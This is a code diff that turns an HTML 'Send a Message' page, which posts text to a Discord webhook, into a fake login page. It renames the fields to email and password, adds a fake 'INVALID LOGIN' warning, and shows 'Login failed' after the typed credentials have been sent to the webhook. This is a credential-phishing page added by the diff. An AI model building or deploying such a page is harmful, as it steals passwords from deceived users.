@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send a Message</title>
+  <title>LOGIN</title>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -215,30 +215,31 @@
       </svg>
     </div>
     <div>
-      <h1>Send a Message</h1>
-      <div class="subtitle">// discord webhook</div>
+      <h1>Please Log In</h1>
+      <div class="subtitle">//</div>
     </div>
   </div>
 
   <div class="divider"></div>
 
   <div class="no-webhook-warning" id="noWebhookWarning">
-    ⚠ No webhook URL set — open this file and fill in WEBHOOK_URL at the top of the script.
+    ⚠ ERROR ⚠
+    INVALID LOGIN
   </div>
 
   <div class="field">
-    <label>Your name</label>
+    <label>Email Adress</label>
     <input type="text" id="usernameOverride" placeholder="Anonymous" maxlength="80"/>
   </div>
 
   <div class="field">
-    <label>Message</label>
+    <label>Password</label>
     <textarea id="messageContent" placeholder="Type something..." maxlength="2000"></textarea>
     <div class="char-count" id="charCount">0 / 2000</div>
   </div>
 
   <button class="send-btn" id="sendBtn" onclick="sendWebhook()">
-    <span class="btn-text">Send →</span>
+    <span class="btn-text">Login</span>
     <span class="spinner">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
         <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke-linecap="round"/>
@@ -270,8 +271,8 @@
   const charCount = document.getElementById('charCount');
   msgEl.addEventListener('input', () => {
     const len = msgEl.value.length;
-    charCount.textContent = `${len} / 2000`;
-    charCount.className = 'char-count' + (len > 1900 ? ' warn' : '') + (len >= 2000 ? ' over' : '');
+    charCount.textContent = `${len} / 15`;
+    charCount.className = 'char-count' + (len > 14 ? ' warn' : '') + (len >= 15 ? ' over' : '');
   });
 
   let toastTimer;
@@ -287,7 +288,7 @@
     const content  = msgEl.value.trim();
     const username = document.getElementById('usernameOverride').value.trim();
 
-    if (!content) { showToast('Message cannot be empty.', 'error'); return; }
+    if (!content) { showToast('Login cannot be empty.', 'error'); return; }
 
     const btn = document.getElementById('sendBtn');
     btn.classList.add('loading');
@@ -304,7 +305,7 @@
       });
 
       if (res.ok || res.status === 204) {
-        showToast('Message sent!', 'success');
+        showToast('Login failed', 'please try again soon');
         msgEl.value = '';
         charCount.textContent = '0 / 2000';
         charCount.className = 'char-count';
